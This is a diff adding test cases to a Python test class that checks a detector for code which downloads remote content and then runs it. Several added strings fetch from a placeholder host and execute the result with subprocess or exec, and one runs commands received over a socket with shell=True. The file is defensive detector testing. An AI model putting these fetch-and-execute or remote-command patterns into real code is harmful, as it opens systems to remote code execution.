@@ -370,6 +370,10 @@ class TestDownloadedThenRun:
             'import requests, subprocess, sys\nr = requests.get("https://h.invalid")\nopen("a.py", "wb").write(r.content)\n'
             'subprocess.run([sys.executable, "a.py"])\n',
             'import urllib.request, os\nurllib.request.urlretrieve("https://h.invalid/x", "/tmp/x")\nos.system("/tmp/x &")\n',
+            'import requests, subprocess, sys\nr = requests.get("https://h.invalid")\nhelper = base / "h.py"\n'
+            "helper.write_bytes(r.content)\nsubprocess.run([sys.executable, str(helper)])\n",
+            'import urllib.request\nbody = urllib.request.urlopen("https://h.invalid").read().decode()\nexec(body)\n',
+            "import subprocess\ncmd = conn.recv(1024).decode()\nsubprocess.run(cmd, shell=True)\n",
         ],
     )
     def test_running_the_downloaded_file_is_fetch_exec(self, source) -> None:
@@ -383,6 +387,9 @@ class TestDownloadedThenRun:
             'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/d.csv", "d.csv")\n'
             'subprocess.run(["wc", "-l", "other.csv"])\n',
             'import subprocess, sys\nopen("gen.py", "w").write("print(1)")\nsubprocess.run([sys.executable, "gen.py"])\n',
+            'import requests, subprocess\nsha = requests.get("https://h.invalid").json()["sha"]\n'
+            'subprocess.run(f"git checkout {sha}", shell=True)\n',
+            "import subprocess\njob = pipe.recv()\nsubprocess.run(job, shell=True)\n",
         ],
     )
     def test_naming_a_download_without_running_it_is_not(self, source) -> None:
